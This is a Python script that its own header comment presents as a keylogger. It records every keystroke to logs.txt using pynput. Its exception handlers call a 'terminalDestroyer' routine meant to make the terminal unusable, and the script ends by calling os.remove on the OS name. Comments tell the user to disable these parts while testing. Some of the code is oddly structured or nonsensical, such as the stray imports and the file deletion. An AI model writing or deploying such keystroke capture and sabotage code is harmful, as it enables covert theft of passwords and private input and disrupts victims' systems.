# This code is a keylogger that captures keystrokes and saves them to a file named "logs.txt". It uses the `pynput` library to listen for keyboard events. The `on_press` function is called whenever a key is pressed, and it appends the key to the log file. The listener runs indefinitely until the program is terminated, which can be done by closing the terminal running the script.

from pynput.keyboard import Key, Listener
from test import run_forever
import make_terminal_unusable
import os
import platform

CURRENT_OS = platform.system()

LOG_FILE = "logs.txt"


def on_press(key):
    """Log each keystroke to logs.txt."""
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key}\n")
    except Exception as e:
        print(f"Error logging keystroke: {e}")
# While testing comment the line below this...
        run_forever(make_terminal_unusable.terminalDestroyer())


def start_keylogger():
    """Start the keylogger listener."""
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()

# While testing the KeyLogger comment the two lines below this...
    except Exception:
        make_terminal_unusable.terminalDestroyer()

if __name__ == "__main__":
    try:
        on_press(key=Key.enter)  # Start logging with a dummy key press
        start_keylogger()


# While testing the KeyLogger comment out the part below this...

    except Exception:
        make_terminal_unusable.terminalDestroyer()

    finally:
        os.remove(CURRENT_OS)
